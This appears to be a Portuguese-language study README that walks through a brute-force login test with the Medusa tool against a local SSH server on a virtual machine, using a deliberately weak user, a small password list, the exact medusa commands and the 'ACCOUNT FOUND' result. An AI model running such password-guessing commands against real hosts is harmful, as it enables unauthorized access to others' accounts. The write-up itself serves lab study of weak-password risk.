# Força-Bruta-Medusa
Esse repositório foi criado para estudo sobre teste de força bruta usando software Medusa em ambiente linux
Aqui eu mostro como fiz um teste de autenticação contra um servidor SSH local, usando usuários e senhas criados especificamente para o experimento.

Ambiente Utilizado
Linux Ubuntu (máquina virtual)
Medusa instalado via apt
Serviço SSH rodando localmente
Usuário “teste” com senha fraca proposital para fins de demonstração

Instalando o Medusa
sudo apt update
sudo apt install medusa -y

verificar se instalou corretamente:
medusa -h

Criando um Usuário Fraco para o Teste
Esse usuário existe somente na máquina virtual criada para o experimento.
sudo useradd teste
echo "teste:1234" | sudo chpasswd

Usuário: teste
Senha: 1234
Essa senha é fraca de propósito para mostrar como um ataque de força bruta funciona.

Criando uma Wordlist Simples
Criei um arquivo chamado senhas.txt com algumas senhas comuns:
admin
123
senha
1234
password

E também um arquivo usuarios.txt:
teste

Rodando o Teste de Força Bruta
Teste direto com usuário único:
medusa -h 127.0.0.1 -u teste -P senhas.txt -M ssh
Ou usando lista de usuários:
medusa -h 127.0.0.1 -U usuarios.txt -P senhas.txt -M ssh

Explicação dos Parâmetros
Parâmetro	Explicação
-h	Endereço do alvo (aqui é o próprio PC: 127.0.0.1)
-u	Usuário único
-U	Lista de usuários
-P	Lista de senhas
-M	Módulo (SSH no caso)
🧪 Resultado Obtido

Quando a senha correta é encontrada, a saída do Medusa fica assim:
ACCOUNT FOUND: [ssh] Host: 127.0.0.1 User: teste Password: 1234
